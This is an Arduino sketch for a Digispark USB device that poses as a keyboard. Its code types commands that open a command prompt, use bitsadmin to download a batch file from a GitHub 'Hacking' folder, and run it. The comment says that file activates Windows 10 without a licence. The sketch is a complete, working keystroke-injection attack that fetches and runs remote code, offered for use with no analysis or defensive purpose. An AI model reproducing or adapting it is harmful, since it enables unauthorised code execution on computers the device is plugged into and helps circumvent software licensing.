//This DigiKeyboard Script activates Windows 10 ( any version !! ) by using the script at
// ( https://raw.githubusercontent.com/KushagraKarira/Scripts/master/Hacking/applebanana996/Windows%2010%20Activator.bat )

#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // first char bug
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // as normal user
  DigiKeyboard.delay(500);
  DigiKeyboard.print('bitsadmin /transfer mydownloadjob /download /priority normal "https://raw.githubusercontent.com/KushagraKarira/Scripts/master/Hacking/applebanana996/Windows%2010%20Activator.bat" "C:\Downloads\WinChan.bat"');
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("start C:\Downloads\WinChan.bat"); // execute file
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);

  for (;;) {
    /*empty*/
  }
}
